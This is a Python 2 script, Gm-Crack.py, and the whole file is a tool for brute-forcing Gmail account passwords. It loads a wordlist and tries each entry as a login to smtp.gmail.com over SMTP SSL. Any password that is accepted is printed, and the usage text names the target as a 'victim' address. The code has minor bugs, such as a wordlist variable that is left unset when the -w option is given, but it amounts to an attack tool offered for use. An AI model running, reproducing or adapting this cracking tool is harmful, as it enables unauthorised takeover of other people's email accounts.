#!/usr/bin/python2

#############################
import sys,optparse,platform
sys.path.append('./lib/')
import tools_core,smtplib
#############################
opsys = platform.system()
#############################
def cracking(target,wordlist,server,port):
	print "[#]==============={ ATTACK INFORMATION }===============[#]"
	print " [>] TARGET   : %s" % target
	print " [>] WORDLIST : %s" % wordlist
	print " [>] SERVER   : %s" % server
	print " [>] PORT     : %s" % port
	print "[#]==============={ END OF INFORMATION }===============[#]"
	print ""
	print "[*] Configuring..."
	try:
		gmcrack_core = smtplib.SMTP_SSL(server,port)
		gmcrack_core.ehlo()
		print "[+] Done :)"
	except:
		print "[-] Error ! Use another GMAIL_SMTP Server !!!"
		exit()
	print ""
	print "[*] Preparing Wordlist..."
	try:
		wlist = open(wordlist,'r').readlines()
		jumlah = str(len(wlist))
		print "[+] {} Word-Phrase Loaded !".format(jumlah)
		print "[+] Done :)"
	except:
		print tools_core.err_bukalst
		exit()
	print ""
	print "[#]==============={ LAUNCHING ATTACK }===============[#]"
	print ""
	hitung = 0
	for pwd in wlist:
		hitung += 1
		passkata = pwd.strip()
		if hitung > jumlah:
			print ""
			print "[-] No Password found !!! Don't be sad Mr.Hacker...try to crack it with another Wordlist !"
			break
		try:
			gmcrack_core.login(target,passkata)
			print ""
			print "[ ACCEPTED ]==[{0}/{1}]==[{2}]===> {3}".format(hitung,jumlah,target,passkata)
			break
		except smtplib.SMTPAuthenticationError as ndass:
			error = str(ndass)
			if error[14] == '<':
				print ""
				print "[ ACCEPTED ]==[{0}/{1}]==[{2}]===> {3}".format(hitung,jumlah,target,passkata)
				break
			else:
				print "[ INVALID ]==[{0}/{1}]==[{2}]===> {3}".format(hitung,jumlah,target,passkata)
				pass	
		except KeyboardInterrupt:
			print ""
			print tools_core.err_keyint
			exit()
		except:
			pass
	tools_core.keluar()

def main():
	gmcrack_server = 'smtp.gmail.com'
	gmcrack_port = 465
	tools_core.clearscreen(opsys)
	tools_core.judul()
	parser = optparse.OptionParser('''
 [?] Usage: Use 'Gm-Crack.py --help' to show Help Contents

 [X] Example: Gm-Crack.py -t 'myvictim@gmail.com' -w '/root/wordlist/pass.txt'
  |---> Target is 'myvictim@gmail.com' and Wordlist will used is 'pass.txt'
 [X] Example: Gm-Crack.py -t 'myvictim@gmail.com'
  |---> Target is 'myvictim@gmail.com' and You will use My Default Wordlist...
''')
	parser.add_option("-t",dest="TARGET",help="Specify Target G-mail address !")
	parser.add_option("--target",dest="TARGET",help="Specify Target G-mail address !")
	parser.add_option("-w",dest="PASS_FILE",help="Wordlist File for cracking Password !")
	parser.add_option("--wordlist",dest="PASS_FILE",help="Wordlist File for cracking Password !")
	parser.add_option("--server",dest="GMAIL_SERVER",help="[OPTIONAL] Gmail-Server (Default:'smtp.gmail.com')")
	parser.add_option("--sport",dest="SERVER_PORT",help="[OPTIONAL] Gmail-Server's Port (Default:465)")
	(options, args) = parser.parse_args()
	if (bool(options.TARGET) == False):
		print parser.usage
		exit()
	if (bool(options.PASS_FILE) == False):
		gmcrack_wlist = './wordlist/mxact666_password.txt'
	if (bool(options.GMAIL_SERVER) == True):
		gmcrack_server = str(options.GMAIL_SERVER)
	if (bool(options.SERVER_PORT) == True):
		gmcrack_port = int(options.SERVER_PORT)
	gmcrack_target = str(options.TARGET)
	cracking(gmcrack_target,gmcrack_wlist,gmcrack_server,gmcrack_port)

if __name__ == '__main__':
	main()